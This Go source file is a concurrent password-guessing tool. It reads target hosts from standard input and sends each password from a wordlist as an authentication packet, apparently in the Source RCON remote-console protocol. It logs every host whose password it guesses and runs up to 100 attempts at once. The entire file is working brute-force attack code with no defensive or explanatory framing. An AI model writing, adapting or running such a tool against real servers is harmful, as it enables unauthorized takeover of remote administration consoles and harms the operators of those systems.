package main

import (
	"bufio"
	"flag"
	"log"
	"net"
	"os"
	"time"

	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
)

type Scanner struct {
	passwords []string
	timeout   time.Duration
	threads   int
}

const (
	LOGIN_SUCCESS = "e47032698e86b291bed27d4001f8d9d90664a40f771d1205127d7c7c46360e05"
	LOGIN_ERROR   = "e883145b98f8f15164ea30b08d1f71729285686375479480a341fdfcc5364d85"
)

func (s *Scanner) scanHost(target string, passwords []string) {
	conn, err := net.DialTimeout("tcp", target, s.timeout)

	if err != nil {
		return
	}

	for i := 0; i < len(passwords); i++ {
		conn.SetReadDeadline(time.Now().Add(s.timeout))

		password := passwords[i]

		buf := new(bytes.Buffer)

		for _, data := range []interface{}{
			int32(len(password) + 10),
			int32(0),
			int32(3),
			[]byte(password),
			[]byte{0, 0},
		} {

			if err := binary.Write(buf, binary.LittleEndian, data); err != nil {
				conn.Close()
				return
			}

		}

		encoded := buf.Bytes()

		if _, err := conn.Write(encoded); err != nil {
			conn.Close()
			return
		}

		respBytes := make([]byte, 16)

		n, err := conn.Read(respBytes)

		if err != nil {
			conn.Close()
			return
		}

		hasher := sha256.New()

		hasher.Write(respBytes[:n])

		sum := hex.EncodeToString(hasher.Sum(nil))

		if err != nil || (sum != LOGIN_SUCCESS && sum != LOGIN_ERROR) {
			conn.Close()
			return
		}

		if sum == LOGIN_SUCCESS {
			log.Printf("%s => %s\n", target, password)
			conn.Close()
			return
		}
	}
	conn.Close()
}

func (s *Scanner) Scan() {
	running := 0
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		for {

			if running <= s.threads {
				break
			}

			time.Sleep(time.Millisecond * 500)
		}

		running++

		go func(target string) {
			defer func() { running-- }()

			s.scanHost(target, s.passwords)

		}(scanner.Text())

	}
}

func main() {
	wordlist := flag.String("wordlist", "", "Wordlist file")
	threads := flag.Int("threads", 100, "Number of threads")
	timeout := flag.Int("timeout", 5000, "Timeout in milliseconds")

	flag.Parse()

	if *wordlist == "" {
		log.Fatal("Wordlist file is required")
	}

	f, err := os.Open(*wordlist)

	if err != nil {
		log.Fatal(err)
	}

	if err != nil {
		log.Fatal(err)
	}

	scanner := bufio.NewScanner(f)

	var passwords []string

	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	(&Scanner{
		passwords: passwords,
		timeout:   time.Duration(*timeout) * time.Millisecond,
		threads:   *threads,
	}).Scan()
}
